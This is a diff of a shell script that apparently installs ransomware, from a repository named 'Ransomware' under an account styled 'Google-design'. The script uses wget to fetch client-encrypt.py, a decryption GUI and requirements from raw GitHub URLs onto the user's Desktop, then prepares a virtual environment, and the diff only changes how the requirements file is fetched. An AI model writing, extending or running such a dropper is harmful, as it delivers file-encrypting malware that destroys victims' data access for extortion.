@@ -6,6 +6,7 @@ DESKTOP="$HOME/Desktop"
 REPO_BASE="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch"
 ENCRYPT_PY="client-encrypt.py"
 DECRYPT_PY="client-decrypt-gui.py"
+REQS_URL="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/requirements.txt"
 REQS="requirements.txt"
 VENV_DIR="venv"
 DECRYPT_DESKTOP="${DESKTOP}/decrypt.desktop"
@@ -19,7 +20,7 @@ cd "$DESKTOP" || { echo "Failed to cd $DESKTOP"; exit 1; }
 echo "[*] Downloading client files..."
 wget --show-progress --timeout=15 --tries=2 "${REPO_BASE}/${ENCRYPT_PY}" -O "${DESKTOP}/${ENCRYPT_PY}"
 wget --show-progress --timeout=15 --tries=2 "${REPO_BASE}/${DECRYPT_PY}" -O "${DESKTOP}/${DECRYPT_PY}"
-wget --show-progress --timeout=15 --tries=2 "${REPO_BASE}/${REQS}" -O "${DESKTOP}/${REQS}"
+wget --show-progress --timeout=15 --tries=2 "${REQS_URL}" -O "${DESKTOP}/${REQS}"
 
 # Create virtual environment if not exists
 if [ ! -d "${DESKTOP}/${VENV_DIR}" ]; then
